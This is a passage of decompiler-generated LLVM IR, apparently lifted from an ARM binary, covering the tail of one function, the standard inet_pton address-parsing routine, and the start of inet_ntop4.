  %v1_1583c = trunc i32 %v0_1582c to i8
  %v2_1583c = load i32, i32* @r1, align 4
  %v3_1583c = add i32 %v2_1583c, 1
  %v4_1583c = inttoptr i32 %v3_1583c to i8*
  store i8 %v1_1583c, i8* %v4_1583c, align 1
  %v5_1583c = load i32, i32* @r1, align 4
  %v6_1583c = add i32 %v5_1583c, 1
  store i32 %v6_1583c, i32* @r1, align 4
  br label %dec_label_pc_15840.backedge

dec_label_pc_15840.backedge:                      ; preds = %dec_label_pc_1583c, %dec_label_pc_157fc, %dec_label_pc_15808
  %v0_15840 = load i32, i32* %r0.global-to-local, align 4
  %v1_15840 = inttoptr i32 %v0_15840 to i8*
  %v2_15840 = load i8, i8* %v1_15840, align 1
  %v3_15840 = zext i8 %v2_15840 to i32
  store i32 %v3_15840, i32* @r3, align 4
  %v2_15844 = icmp eq i8 %v2_15840, 0
  store i1 %v2_15844, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15844, label %dec_label_pc_15840.dec_label_pc_15850_crit_edge, label %dec_label_pc_157e0

dec_label_pc_15840.dec_label_pc_15850_crit_edge:  ; preds = %dec_label_pc_15840.backedge
  %v0_15850.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_15850

dec_label_pc_15850:                               ; preds = %dec_label_pc_15840.dec_label_pc_15850_crit_edge, %entry
  %v0_15850 = phi i32 [ %v0_15850.pre, %dec_label_pc_15840.dec_label_pc_15850_crit_edge ], [ 0, %entry ]
  %v7_15850 = icmp eq i32 %v0_15850, 3
  store i1 %v7_15850, i1* %cpsr_z.global-to-local, align 1
  %v7_15854 = icmp slt i32 %v0_15850, 4
  br i1 %v7_15854, label %dec_label_pc_15874, label %dec_label_pc_15858

dec_label_pc_15858:                               ; preds = %dec_label_pc_15850
  %v0_15858 = load i32, i32* @r4, align 4
  store i32 %v0_15858, i32* @r0, align 4
  store i32 %v2_157c8, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_15864 = call i32 @memcpy()
  br label %dec_label_pc_15874

dec_label_pc_15874:                               ; preds = %dec_label_pc_157ec, %dec_label_pc_15808, %dec_label_pc_1581c, %dec_label_pc_15834, %dec_label_pc_15850, %dec_label_pc_15858
  %storemerge = phi i32 [ 1, %dec_label_pc_15858 ], [ 0, %dec_label_pc_15850 ], [ 0, %dec_label_pc_15834 ], [ 0, %dec_label_pc_1581c ], [ 0, %dec_label_pc_15808 ], [ 0, %dec_label_pc_157ec ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v3_157b0, i32* @r4, align 4
  store i32 %v6_157b0, i32* @r5, align 4
  store i32 %v15_157b0, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_15850, { 1, 0 }
  uselistorder i32 %v3_15840, { 2, 1, 0 }
  uselistorder i32 %v0_15840, { 1, 0 }
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 %v2_157f0, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_15874, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_15840.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_157e0, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_15880 = load i32, i32* @r4, align 4
  %v6_15880 = load i32, i32* @r5, align 4
  %v9_15880 = load i32, i32* @r6, align 4
  %v12_15880 = load i32, i32* @r7, align 4
  %v27_15880 = load i32, i32* @lr, align 4
  %v7_1588c = icmp eq i32 %arg1, 2
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v7_1588c, label %dec_label_pc_158ac, label %dec_label_pc_158a0

dec_label_pc_158a0:                               ; preds = %entry
  %v7_158a0 = icmp eq i32 %arg1, 10
  br i1 %v7_158a0, label %dec_label_pc_158bc, label %dec_label_pc_15a74

dec_label_pc_158ac:                               ; preds = %entry
  store i32 %tmp, i32* @r0, align 4
  %v3_158b4 = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  br label %dec_label_pc_15a8c

dec_label_pc_158bc:                               ; preds = %dec_label_pc_158a0
  %v2_158bc = ptrtoint i32* %stack_var_-56 to i32
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_158c8 = bitcast i32* %stack_var_-56 to i8*
  %v4_158c8 = call i32 @__GI_memset(i8* %v3_158c8, i32 0, i32 16)
  %v0_158cc = load i32, i32* @r5, align 4
  %v1_158cc = inttoptr i32 %v0_158cc to i8*
  %v2_158cc = load i8, i8* %v1_158cc, align 1
  %v3_158cc = zext i8 %v2_158cc to i32
  store i32 %v3_158cc, i32* %r3.global-to-local, align 4
  %v7_158d0 = icmp eq i8 %v2_158cc, 58
  store i32 %v4_158c8, i32* @r6, align 4
  %v2_158d8 = add i32 %v4_158c8, 16
  store i32 %v2_158d8, i32* %r8.global-to-local, align 4
  br i1 %v7_158d0, label %dec_label_pc_158e0, label %dec_label_pc_158ec

dec_label_pc_158e0:                               ; preds = %dec_label_pc_158bc
  %v1_158e0 = add i32 %v0_158cc, 1
  %v2_158e0 = inttoptr i32 %v1_158e0 to i8*
  %v3_158e0 = load i8, i8* %v2_158e0, align 1
  %v4_158e0 = zext i8 %v3_158e0 to i32
  store i32 %v4_158e0, i32* %r3.global-to-local, align 4
  store i32 %v1_158e0, i32* @r5, align 4
  %v7_158e4 = icmp eq i8 %v3_158e0, 58
  br i1 %v7_158e4, label %dec_label_pc_158ec, label %dec_label_pc_15a6c

dec_label_pc_158ec:                               ; preds = %dec_label_pc_158e0, %dec_label_pc_158bc
  %v0_158f8 = phi i32 [ %v1_158e0, %dec_label_pc_158e0 ], [ %v0_158cc, %dec_label_pc_158bc ]
  store i32 -34012, i32* @r3, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v0_158f4 = load i32, i32* @r4, align 4
  %v2_158f4 = add i32 %v0_158f4, -34012
  store i32 %v0_158f8, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  store i32 %v2_158f4, i32* %stack_var_-64, align 4
  %v1_159d03 = inttoptr i32 %v0_158f8 to i8*
  %v2_159d04 = load i8, i8* %v1_159d03, align 1
  %v3_159d05 = zext i8 %v2_159d04 to i32
  store i32 %v3_159d05, i32* @r4, align 4
  %v2_159d46 = icmp eq i8 %v2_159d04, 0
  br i1 %v2_159d46, label %dec_label_pc_159dc.thread, label %dec_label_pc_1590c

dec_label_pc_159dc.thread:                        ; preds = %dec_label_pc_158ec
  store i32 %v4_158c8, i32* @r4, align 4
  br label %dec_label_pc_15a08

dec_label_pc_1590c:                               ; preds = %dec_label_pc_158ec, %dec_label_pc_159d0.backedge.dec_label_pc_1590c_crit_edge
  %v0_15910 = phi i32 [ %v3_159d0, %dec_label_pc_159d0.backedge.dec_label_pc_1590c_crit_edge ], [ %v3_159d05, %dec_label_pc_158ec ]
  %v2_1590c = phi i32 [ %v2_1590c.pre, %dec_label_pc_159d0.backedge.dec_label_pc_1590c_crit_edge ], [ %v2_158f4, %dec_label_pc_158ec ]
  store i32 %v2_1590c, i32* @r0, align 4
  %v1_15910 = or i32 %v0_15910, 32
  %v2_15914 = call i32 @__GI_strchr(i32 %v2_1590c, i32 %v1_15910)
  %v2_15918 = icmp eq i32 %v2_15914, 0
  %v0_1591c = load i32, i32* @r5, align 4
  %v1_1591c = add i32 %v0_1591c, 1
  store i32 %v1_1591c, i32* @r5, align 4
  br i1 %v2_15918, label %dec_label_pc_15940, label %dec_label_pc_15924

dec_label_pc_15924:                               ; preds = %dec_label_pc_1590c
  %v2_15924 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_15924, i32* %r2.global-to-local, align 4
  %v2_15928 = sub i32 %v2_15914, %v2_15924
  %v1_1592c = load i32, i32* @r7, align 4
  %v4_1592c = mul i32 %v1_1592c, 16
  %v5_1592c = or i32 %v4_1592c, %v2_15928
  store i32 %v5_1592c, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_ffff.655 to i32), i32* @r3, align 4
  %tmp35 = icmp ugt i32 %v5_1592c, ptrtoint (i32* @global_var_ffff.655 to i32)
  br i1 %tmp35, label %dec_label_pc_15a6c, label %dec_label_pc_159cc

dec_label_pc_15940:                               ; preds = %dec_label_pc_1590c
  %v0_15940 = load i32, i32* @r4, align 4
  %v7_15940 = icmp eq i32 %v0_15940, 58
  br i1 %v7_15940, label %dec_label_pc_15948, label %dec_label_pc_159a0

dec_label_pc_15948:                               ; preds = %dec_label_pc_15940
  %v0_15948 = load i32, i32* %sb.global-to-local, align 4
  %v2_15948 = icmp eq i32 %v0_15948, 0
  br i1 %v2_15948, label %dec_label_pc_15950, label %dec_label_pc_15964

dec_label_pc_15950:                               ; preds = %dec_label_pc_15948
  %v0_15950 = load i32, i32* %fp.global-to-local, align 4
  %v2_15950 = icmp eq i32 %v0_15950, 0
  br i1 %v2_15950, label %dec_label_pc_15958, label %dec_label_pc_15a6c

dec_label_pc_15958:                               ; preds = %dec_label_pc_15950
  %v0_15958 = load i32, i32* @r6, align 4
  store i32 %v0_15958, i32* %fp.global-to-local, align 4
  store i32 %v1_1591c, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_159d0.backedge

dec_label_pc_15964:                               ; preds = %dec_label_pc_15948
  %v1_15964 = inttoptr i32 %v1_1591c to i8*
  %v2_15964 = load i8, i8* %v1_15964, align 1
  %v3_15964 = zext i8 %v2_15964 to i32
  store i32 %v3_15964, i32* %r3.global-to-local, align 4
  %v2_15968 = icmp eq i8 %v2_15964, 0
  br i1 %v2_15968, label %dec_label_pc_15a6c, label %dec_label_pc_15970

dec_label_pc_15970:                               ; preds = %dec_label_pc_15964
  %v0_15970 = load i32, i32* @r6, align 4
  %v1_15970 = add i32 %v0_15970, 2
  store i32 %v1_15970, i32* %r3.global-to-local, align 4
  %v1_15974 = load i32, i32* %r8.global-to-local, align 4
  %tmp36 = icmp ugt i32 %v1_15970, %v1_15974
  br i1 %tmp36, label %dec_label_pc_15a6c, label %dec_label_pc_1597c

dec_label_pc_1597c:                               ; preds = %dec_label_pc_15970
  %v0_1597c = load i32, i32* @r7, align 4
  %v3_1597c = udiv i32 %v0_1597c, 256
  store i32 %v3_1597c, i32* %r2.global-to-local, align 4
  store i32 %v0_15970, i32* %r3.global-to-local, align 4
  %v1_15984 = trunc i32 %v3_1597c to i8
  %v3_15984 = inttoptr i32 %v0_15970 to i8*
  store i8 %v1_15984, i8* %v3_15984, align 1
  %v4_15984 = load i32, i32* %r3.global-to-local, align 4
  %v5_15984 = add i32 %v4_15984, 1
  store i32 %v5_15984, i32* @r3, align 4
  %v0_15988 = load i32, i32* @r7, align 4
  %v1_15988 = trunc i32 %v0_15988 to i8
  %v2_15988 = load i32, i32* @r6, align 4
  %v3_15988 = add i32 %v2_15988, 1
  %v4_15988 = inttoptr i32 %v3_15988 to i8*
  store i8 %v1_15988, i8* %v4_15988, align 1
  store i32 0, i32* @r7, align 4
  %v0_15990 = load i32, i32* @r3, align 4
  %v1_15990 = add i32 %v0_15990, 1
  store i32 %v1_15990, i32* @r6, align 4
  %v0_15994 = load i32, i32* @r5, align 4
  store i32 %v0_15994, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_159d0.backedge

dec_label_pc_159a0:                               ; preds = %dec_label_pc_15940
  %v7_159a0 = icmp eq i32 %v0_15940, 46
  br i1 %v7_159a0, label %dec_label_pc_159a8, label %dec_label_pc_15a6c

dec_label_pc_159a8:                               ; preds = %dec_label_pc_159a0
  %v0_159a8 = load i32, i32* @r6, align 4
  %v1_159a8 = add i32 %v0_159a8, 4
  store i32 %v1_159a8, i32* @r4, align 4
  %v1_159ac = load i32, i32* %r8.global-to-local, align 4
  %tmp37 = icmp ugt i32 %v1_159a8, %v1_159ac
  br i1 %tmp37, label %dec_label_pc_15a6c, label %dec_label_pc_159b4

dec_label_pc_159b4:                               ; preds = %dec_label_pc_159a8
  %v0_159b4 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_159b4, i32* @r0, align 4
  %v3_159bc = call i32 @inet_pton4(i32 %v0_159b4, i32 %v0_159a8)
  %v5_159c4 = icmp sgt i32 %v3_159bc, 0
  br i1 %v5_159c4, label %dec_label_pc_159b4.dec_label_pc_15a08_crit_edge, label %dec_label_pc_15a6c

dec_label_pc_159b4.dec_label_pc_15a08_crit_edge:  ; preds = %dec_label_pc_159b4
  %v0_15a4c.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15a08

dec_label_pc_159cc:                               ; preds = %dec_label_pc_15924
  store i32 1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_159d0.backedge

dec_label_pc_159d0.backedge:                      ; preds = %dec_label_pc_159cc, %dec_label_pc_15958, %dec_label_pc_1597c
  %v0_159d0 = phi i32 [ %v1_1591c, %dec_label_pc_159cc ], [ %v1_1591c, %dec_label_pc_15958 ], [ %v0_15994, %dec_label_pc_1597c ]
  %v0_159dc12 = phi i32 [ 1, %dec_label_pc_159cc ], [ 0, %dec_label_pc_15958 ], [ 0, %dec_label_pc_1597c ]
  %v1_159d0 = inttoptr i32 %v0_159d0 to i8*
  %v2_159d0 = load i8, i8* %v1_159d0, align 1
  %v3_159d0 = zext i8 %v2_159d0 to i32
  store i32 %v3_159d0, i32* @r4, align 4
  %v2_159d4 = icmp eq i8 %v2_159d0, 0
  br i1 %v2_159d4, label %dec_label_pc_159dc, label %dec_label_pc_159d0.backedge.dec_label_pc_1590c_crit_edge

dec_label_pc_159d0.backedge.dec_label_pc_1590c_crit_edge: ; preds = %dec_label_pc_159d0.backedge
  %v2_1590c.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_1590c

dec_label_pc_159dc:                               ; preds = %dec_label_pc_159d0.backedge
  %v0_159e0.pre = load i32, i32* @r6, align 4
  %v2_159dc = icmp eq i32 %v0_159dc12, 0
  store i32 %v0_159e0.pre, i32* @r4, align 4
  br i1 %v2_159dc, label %dec_label_pc_15a08, label %dec_label_pc_159e8

dec_label_pc_159e8:                               ; preds = %dec_label_pc_159dc
  %v1_159e8 = add i32 %v0_159e0.pre, 2
  store i32 %v1_159e8, i32* %r3.global-to-local, align 4
  %v1_159ec = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_159e8, %v1_159ec
  br i1 %tmp38, label %dec_label_pc_15a6c, label %dec_label_pc_159f4

dec_label_pc_159f4:                               ; preds = %dec_label_pc_159e8
  store i32 %v0_159e0.pre, i32* %r3.global-to-local, align 4
  %v0_159f8 = load i32, i32* @r7, align 4
  %v3_159f8 = udiv i32 %v0_159f8, 256
  store i32 %v3_159f8, i32* %r2.global-to-local, align 4
  %v1_159fc = trunc i32 %v3_159f8 to i8
  %v3_159fc = inttoptr i32 %v0_159e0.pre to i8*
  store i8 %v1_159fc, i8* %v3_159fc, align 1
  %v4_159fc = load i32, i32* %r3.global-to-local, align 4
  %v5_159fc = add i32 %v4_159fc, 1
  store i32 %v5_159fc, i32* @r3, align 4
  %v0_15a00 = load i32, i32* @r7, align 4
  %v1_15a00 = trunc i32 %v0_15a00 to i8
  %v2_15a00 = load i32, i32* @r6, align 4
  %v3_15a00 = add i32 %v2_15a00, 1
  %v4_15a00 = inttoptr i32 %v3_15a00 to i8*
  store i8 %v1_15a00, i8* %v4_15a00, align 1
  %v0_15a04 = load i32, i32* @r3, align 4
  %v1_15a04 = add i32 %v0_15a04, 1
  store i32 %v1_15a04, i32* @r4, align 4
  br label %dec_label_pc_15a08

dec_label_pc_15a08:                               ; preds = %dec_label_pc_159b4.dec_label_pc_15a08_crit_edge, %dec_label_pc_159dc.thread, %dec_label_pc_159dc, %dec_label_pc_159f4
  %v0_15a4c.pre = phi i32 [ %v0_15a4c.pre.pre, %dec_label_pc_159b4.dec_label_pc_15a08_crit_edge ], [ %v4_158c8, %dec_label_pc_159dc.thread ], [ %v0_159e0.pre, %dec_label_pc_159dc ], [ %v1_15a04, %dec_label_pc_159f4 ]
  %v0_15a08 = load i32, i32* %fp.global-to-local, align 4
  %v2_15a08 = icmp eq i32 %v0_15a08, 0
  %v1_15a4c.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_15a08, label %dec_label_pc_15a4c, label %dec_label_pc_15a10

dec_label_pc_15a10:                               ; preds = %dec_label_pc_15a08
  %v9_15a10 = icmp eq i32 %v0_15a4c.pre, %v1_15a4c.pre
  %v2_15a14 = sub i32 %v0_15a4c.pre, %v0_15a08
  store i32 %v2_15a14, i32* @ip, align 4
  br i1 %v9_15a10, label %dec_label_pc_15a6c, label %dec_label_pc_15a34.preheader

dec_label_pc_15a34.preheader:                     ; preds = %dec_label_pc_15a10
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_15a34

dec_label_pc_15a28:                               ; preds = %dec_label_pc_15a34
  %v2_15a3c = sub i32 %v0_15a48, %v0_15a40
  %v0_15a28 = load i32, i32* %fp.global-to-local, align 4
  %v2_15a28 = add i32 %v0_15a28, %v2_15a38
  %v3_15a28 = inttoptr i32 %v2_15a28 to i8*
  %v4_15a28 = load i8, i8* %v3_15a28, align 1
  %v6_15a28 = zext i8 %v4_15a28 to i32
  store i32 %v6_15a28, i32* @r3, align 4
  %v3_15a2c = inttoptr i32 %v2_15a3c to i8*
  store i8 %v4_15a28, i8* %v3_15a2c, align 1
  %v0_15a30 = load i32, i32* @lr, align 4
  %v1_15a30 = trunc i32 %v0_15a30 to i8
  %v2_15a30 = load i32, i32* %fp.global-to-local, align 4
  %v3_15a30 = load i32, i32* @r1, align 4
  %v4_15a30 = add i32 %v3_15a30, %v2_15a30
  %v5_15a30 = inttoptr i32 %v4_15a30 to i8*
  store i8 %v1_15a30, i8* %v5_15a30, align 1
  %v0_15a34.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15a34.pre = load i32, i32* @ip, align 4
  %v1_15a3c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15a34

dec_label_pc_15a34:                               ; preds = %dec_label_pc_15a34.preheader, %dec_label_pc_15a28
  %v0_15a48 = phi i32 [ %v1_15a4c.pre, %dec_label_pc_15a34.preheader ], [ %v1_15a3c.pre, %dec_label_pc_15a28 ]
  %v1_15a38 = phi i32 [ %v2_15a14, %dec_label_pc_15a34.preheader ], [ %v1_15a34.pre, %dec_label_pc_15a28 ]
  %v0_15a40 = phi i32 [ 1, %dec_label_pc_15a34.preheader ], [ %v0_15a34.pre, %dec_label_pc_15a28 ]
  %v2_15a34 = sub i32 %v0_15a40, %v1_15a38
  %v4_15a34 = xor i32 %v0_15a40, %v1_15a38
  %v5_15a34 = xor i32 %v2_15a34, %v0_15a40
  %v6_15a34 = and i32 %v5_15a34, %v4_15a34
  %v7_15a34 = icmp slt i32 %v6_15a34, 0
  %v8_15a34 = icmp slt i32 %v2_15a34, 0
  %v9_15a34 = icmp eq i32 %v0_15a40, %v1_15a38
  %v2_15a38 = sub i32 %v1_15a38, %v0_15a40
  store i32 %v2_15a38, i32* @r1, align 4
  %v1_15a40 = add i32 %v0_15a40, 1
  store i32 %v1_15a40, i32* %r2.global-to-local, align 4
  %v3_15a44 = xor i1 %v8_15a34, %v7_15a34
  %v4_15a44 = or i1 %v9_15a34, %v3_15a44
  br i1 %v4_15a44, label %dec_label_pc_15a28, label %dec_label_pc_15a48

dec_label_pc_15a48:                               ; preds = %dec_label_pc_15a34
  store i32 %v0_15a48, i32* @r4, align 4
  br label %dec_label_pc_15a4c

dec_label_pc_15a4c:                               ; preds = %dec_label_pc_15a08, %dec_label_pc_15a48
  %v0_15a4c = phi i32 [ %v0_15a48, %dec_label_pc_15a48 ], [ %v0_15a4c.pre, %dec_label_pc_15a08 ]
  %v1_15a4c = phi i32 [ %v0_15a48, %dec_label_pc_15a48 ], [ %v1_15a4c.pre, %dec_label_pc_15a08 ]
  %v9_15a4c = icmp eq i32 %v0_15a4c, %v1_15a4c
  br i1 %v9_15a4c, label %dec_label_pc_15a54, label %dec_label_pc_15a6c

dec_label_pc_15a54:                               ; preds = %dec_label_pc_15a4c
  store i32 %arg3, i32* @r0, align 4
  store i32 %v2_158bc, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_15a60 = call i32 @memcpy()
  br label %dec_label_pc_15a8c

dec_label_pc_15a6c:                               ; preds = %dec_label_pc_15924, %dec_label_pc_15950, %dec_label_pc_15970, %dec_label_pc_15964, %dec_label_pc_15a10, %dec_label_pc_159b4, %dec_label_pc_159a0, %dec_label_pc_15a4c, %dec_label_pc_158e0, %dec_label_pc_159e8, %dec_label_pc_159a8
  br label %dec_label_pc_15a8c

dec_label_pc_15a74:                               ; preds = %dec_label_pc_158a0
  store i32 58860, i32* %r3.global-to-local, align 4
  %v0_15a78 = call i32 @__aeabi_read_tp()
  %v3_15a7c = load i16, i16* @global_var_24070.401, align 2
  %v4_15a7c = sext i16 %v3_15a7c to i32
  store i32 %v4_15a7c, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r2.global-to-local, align 4
  %v3_15a84 = add i32 %v4_15a7c, %v0_15a78
  %v4_15a84 = inttoptr i32 %v3_15a84 to i32*
  store i32 97, i32* %v4_15a84, align 4
  br label %dec_label_pc_15a8c

dec_label_pc_15a8c:                               ; preds = %dec_label_pc_15a6c, %dec_label_pc_15a54, %dec_label_pc_158ac, %dec_label_pc_15a74
  %v1_15a94 = phi i32 [ 0, %dec_label_pc_15a6c ], [ 1, %dec_label_pc_15a54 ], [ %v3_158b4, %dec_label_pc_158ac ], [ -1, %dec_label_pc_15a74 ]
  store i32 %v3_15880, i32* @r4, align 4
  store i32 %v6_15880, i32* @r5, align 4
  store i32 %v9_15880, i32* @r6, align 4
  store i32 %v12_15880, i32* @r7, align 4
  store i32 %v27_15880, i32* @lr, align 4
  ret i32 %v1_15a94

; uselistorder directives
  uselistorder i32 %v2_15a38, { 1, 0 }
  uselistorder i32 %v2_15a34, { 1, 0 }
  uselistorder i32 %v0_15a40, { 2, 3, 6, 0, 1, 5, 4 }
  uselistorder i32 %v1_15a38, { 1, 3, 0, 2 }
  uselistorder i32 %v0_15a48, { 1, 0, 2, 3 }
  uselistorder i32 %v1_15a4c.pre, { 0, 2, 1 }
  uselistorder i32 %v0_15a4c.pre, { 2, 0, 1 }
  uselistorder i32 %v3_159f8, { 1, 0 }
  uselistorder i32 %v0_159e0.pre, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_159d0, { 1, 0 }
  uselistorder i32 %v3_1597c, { 1, 0 }
  uselistorder i32 %v0_15970, { 1, 0, 2 }
  uselistorder i32 %v1_1591c, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_1590c, { 1, 0 }
  uselistorder i32 %v0_158f8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 2, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder label %dec_label_pc_15a8c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_15a6c, { 7, 4, 9, 5, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_15a4c, { 1, 0 }
  uselistorder label %dec_label_pc_15a34, { 1, 0 }
  uselistorder label %dec_label_pc_15a08, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_159d0.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1590c, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-57 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-72, align 4
  store i32 0, i32* %stack_var_-57, align 4
  %v2_15b80 = ptrtoint i32* %stack_var_-40 to i32
  %v2_15b60 = add i32 %v2_15b80, -17
  br label %dec_label_pc_15b80

dec_label_pc_15ad0:                               ; preds = %dec_label_pc_15b80
  %v0_15ad0 = load i32, i32* %fp.global-to-local, align 4
  %v2_15ad0 = add i32 %v0_15ad0, %v1_15ad0
  %v3_15ad0 = inttoptr i32 %v2_15ad0 to i8*
  %v4_15ad0 = load i8, i8* %v3_15ad0, align 1
  %v6_15ad0 = zext i8 %v4_15ad0 to i32
  store i32 %v6_15ad0, i32* %r4.global-to-local, align 4
  %div4 = udiv i8 %v4_15ad0, 100
  %v2_15ad8 = zext i8 %div4 to i32
  store i32 %v2_15ad8, i32* %r0.global-to-local, align 4
  %v1_15adc = or i8 %div4, 48
  %v3_15ae0 = add i32 %v2_15b90, -17
  %v4_15ae0 = inttoptr i32 %v3_15ae0 to i8*
  store i8 %v1_15adc, i8* %v4_15ae0, align 1
  %v0_15ae4 = load i32, i32* %r5.global-to-local, align 4
  %v1_15ae4 = add i32 %v0_15ae4, -17
  %v2_15ae4 = inttoptr i32 %v1_15ae4 to i8*
  %v3_15ae4 = load i8, i8* %v2_15ae4, align 1
  %v0_15ae8 = load i32, i32* %r6.global-to-local, align 4
  %v1_15ae8 = add i32 %v0_15ae8, 1
  store i32 %v1_15ae8, i32* %r6.global-to-local, align 4
  %v7_15af0 = icmp eq i8 %v3_15ae4, 48
  %v0_15af8 = load i32, i32* %r4.global-to-local, align 4
  %v0_15b00 = load i32, i32* %fp.global-to-local, align 4
  %v1_15b00 = load i32, i32* %sl.global-to-local, align 4
  %v2_15b00 = add i32 %v1_15b00, %v0_15b00
  store i32 %v2_15b00, i32* %sb.global-to-local, align 4
  %v2_15b08 = udiv i32 %v0_15af8, 10
  %v1_15b10 = urem i32 %v2_15b08, 256
  %v2_15b14 = udiv i32 %v1_15b10, 10
  %v3_15b14 = urem i32 %v1_15b10, 10
  store i32 %v2_15b14, i32* %r0.global-to-local, align 4
  %v1_15b18 = or i32 %v3_15b14, 48
  store i32 %v1_15b18, i32* %r1.global-to-local, align 4
  br i1 %v7_15af0, label %dec_label_pc_15b08, label %dec_label_pc_15b30

dec_label_pc_15b08:                               ; preds = %dec_label_pc_15ad0
  %v7_15b20 = icmp eq i32 %v1_15b18, 48
  br i1 %v7_15b20, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_15b08
  store i32 %v1_15ae8, i32* %r7.global-to-local, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_15b08, %bb
  %v1_15b28 = trunc i32 %v1_15b18 to i8
  store i8 %v1_15b28, i8* %v2_15ae4, align 1
  %v0_15b5c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15b4c

dec_label_pc_15b30:                               ; preds = %dec_label_pc_15ad0
  %v2_15afc = add i32 %v1_15ae8, %v2_15b80
  %v1_15b44 = trunc i32 %v1_15b18 to i8
  %v3_15b44 = add i32 %v2_15afc, -17
  %v4_15b44 = inttoptr i32 %v3_15b44 to i8*
  store i8 %v1_15b44, i8* %v4_15b44, align 1
  %v0_15b48 = load i32, i32* %r6.global-to-local, align 4
  %v1_15b48 = add i32 %v0_15b48, 1
  store i32 %v1_15b48, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15b4c

dec_label_pc_15b4c:                               ; preds = %bb18, %dec_label_pc_15b30
  %v0_15b5c = phi i32 [ %v0_15b5c.pre, %bb18 ], [ %v1_15b48, %dec_label_pc_15b30 ]
  %v0_15b4c = load i32, i32* %sb.global-to-local, align 4
  %v1_15b4c = inttoptr i32 %v0_15b4c to i8*
  %v2_15b4c = load i8, i8* %v1_15b4c, align 1
  %tmp19 = urem i8 %v2_15b4c, 10
  %v3_15b54 = zext i8 %tmp19 to i32
  store i32 %v2_15b80, i32* %ip.global-to-local, align 4
  %v1_15b5c = add i32 %v0_15b5c, 1
  store i32 %v1_15b5c, i32* %r0.global-to-local, align 4
  %v1_15b64 = or i32 %v3_15b54, 48
  store i32 %v1_15b64, i32* %r1.global-to-local, align 4
  %v1_15b68 = trunc i32 %v1_15b64 to i8
